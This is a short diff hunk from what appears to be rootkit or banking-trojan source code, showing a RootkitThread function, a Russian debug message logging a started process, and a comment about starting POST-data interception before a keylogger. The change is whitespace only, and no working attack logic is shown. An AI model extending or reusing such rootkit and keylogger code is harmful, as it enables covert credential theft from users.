@@ -428,7 +428,7 @@ DWORD WINAPI RootkitThread( LPVOID lpData, LPVOID, LPVOID )
 		hashApp = File::GetNameHashA(AppName, true);
 	}
 
-    RTKDBG("rotkit", "Запущен процесс %s", AppName);
+    RTKDBG("rotkit", "Запущен процесс %s", AppName );
 
 	//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 	//инициализируем систему оповещения о пост данных, должен быть запущен раньше кейлогера
